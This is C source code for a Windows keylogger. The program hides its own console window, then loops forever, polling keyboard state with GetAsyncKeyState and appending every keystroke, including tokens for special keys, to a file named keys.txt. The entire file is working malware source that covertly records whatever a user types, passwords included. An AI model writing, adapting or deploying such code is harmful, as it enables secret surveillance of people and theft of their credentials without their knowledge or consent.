#include <stdio.h>
#include <windows.h> 
#include <winuser.h>

void write (int key) {
    
 
    FILE * file;
    file = fopen("keys.txt", "a+");
	
	if ((key == 1) || (key == 2))
        fprintf(file, "%s", "\n");
		
	else {
  
 
		if (key == VK_BACK)
			fprintf(file, "%s", "{BACKSPACE}");
			
		else if (key == VK_RETURN)
			fprintf(file, "%s", "\n");
			
		else if (key == VK_SPACE)
			fprintf(file, "%s", " ");
		else if (key == VK_TAB)
			fprintf(file, "%s", "{TAB}");
			
		else if (key == VK_SHIFT)
			fprintf(file, "%s", "{SHIFT}");
			
		else if (key == VK_CONTROL)
			fprintf(file, "%s", "{CONTROL}");
			
		else if (key == VK_ESCAPE)
			fprintf(file, "%s", "{ESCAPE}");
			
		else if (key == VK_NUMPAD0)
			fprintf(file, "%s", "0");

        else if (key == VK_NUMPAD1)
			fprintf(file, "%s", "1");

        else if (key == VK_NUMPAD2)
			fprintf(file, "%s", "2");

        else if (key == VK_NUMPAD3)
			fprintf(file, "%s", "3");

        else if (key == VK_NUMPAD4)
			fprintf(file, "%s", "4");

        else if (key == VK_NUMPAD5)
			fprintf(file, "%s", "5");

        else if (key == VK_NUMPAD6)
			fprintf(file, "%s", "6");
            
        else if (key == VK_NUMPAD7)
			fprintf(file, "%s", "7");

        else if (key == VK_NUMPAD8)
			fprintf(file, "%s", "8");

        else if (key == VK_NUMPAD9)
			fprintf(file, "%s", "9");
			
		else if (key == 190 || key == 110)
			fprintf(file, "%s", ".");
			
		else
			fprintf (file, "%s", &key);
	}
 
    fclose(file);
}
 
int main() {

	HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
    
    char i;
 
    while (1) {
        for(i = 8; i <= 227; i++) {
            if (GetAsyncKeyState(i) == -32767)
                write(i);
        }
    }
    system("PAUSE");
    return 0;
}